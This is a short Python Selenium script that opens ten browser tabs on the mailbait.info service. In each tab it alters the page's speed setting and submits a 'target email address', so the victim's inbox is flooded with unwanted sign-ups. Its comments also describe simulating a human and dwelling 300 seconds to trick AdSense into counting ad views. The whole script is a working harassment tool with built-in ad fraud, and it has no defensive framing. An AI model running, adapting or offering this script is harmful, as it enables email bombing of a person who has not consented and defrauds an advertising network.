from selenium import webdriver
import time
from random import randint

email = input('Please enter target email address: ')
driver = webdriver.Chrome() 
url = "https://mailbait.info/run.html"

print(10*"-")
print('Creating 10 Attack Tabs per script: ')
print(10*"-")

for i in range(10):
    driver.switch_to.window(driver.window_handles[-1])
    driver.get(url)
    driver.execute_script('document.querySelector("#speed > option").value = -11000')

    text_box = driver.find_element_by_id('.mbe')

    text_box.send_keys(email)

    categories_check = driver.find_element_by_id('categories1')

    run = driver.find_element_by_id('runt')
    run.click()
    
    print(f'The current tab is: {i + 1}')
    categories_check.click() # This helps simulate a human user for adsense and moves the Categories out of the way so you can see the flow rate.
    
    print('Sleeping for 300 seconds...')
    time.sleep(300) # This dwell time is important to trick adsense into thinking a human user is watching ads on mailbait.info.

    driver.execute_script("window.open('https://mailbait.info/run.html');")
    
driver.close()

print(10*"-")
print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
print('Check your Network tab or similar in your browser to watch forms being filled at lightspeed')
print(10*"-")
